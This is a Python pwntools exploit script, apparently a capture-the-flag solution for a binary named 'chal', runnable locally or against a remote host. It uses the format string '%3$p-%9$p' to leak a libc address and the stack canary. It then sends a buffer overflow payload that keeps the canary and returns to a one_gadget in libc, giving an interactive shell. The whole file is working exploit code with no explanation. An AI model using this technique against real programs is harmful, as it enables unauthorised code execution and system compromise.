from pwn import *
import sys
context.log_level = 'debug'
context.arch = 'amd64'
if len(sys.argv) == 1:
    r = process('./chal')
    if args.GDB:
        gdb.attach(r)
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    print('Usage: python3 {} [GDB | remote]'.format(sys.argv[0]))
    sys.exit(1)
s = lambda data: r.send(data)
sl = lambda data: r.sendline(data)
sa = lambda x, y: r.sendafter(x, y)
sla = lambda x, y: r.sendlineafter(x, y)
ru = lambda delims, drop=True: r.recvuntil(delims, drop)
uu32 = lambda data, num: u32(r.recvuntil(data)[-num:].ljust(4, b'\x00'))
uu64 = lambda data, num: u64(r.recvuntil(data)[-num:].ljust(8, b'\x00'))
leak = lambda name, addr: log.success('{} = {}'.format(name, addr))
l64 = lambda : u64(r.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
l32 = lambda : u32(r.recvuntil('\xf7')[-4:].ljust(4, b'\x00'))

sla('e: ', '1')
sla('buy? ', '1')
sla('buy? ', '1')
sla('ss: ', '%3$p-%9$p')
cnt = ru('\n', False)
cnt = cnt.split(b'-')
libc = int(cnt[0], 16) - 0x21aaa0
leak('libc', hex(libc))
canary = int(cnt[1], 16)
leak('canary', hex(canary))
og = libc + 0xebd3f
payload2 = b'A' * 0x18 + p64(canary) + p64(libc + 0x21be00) + p64(og)
sla('club: ', payload2)
r.interactive()
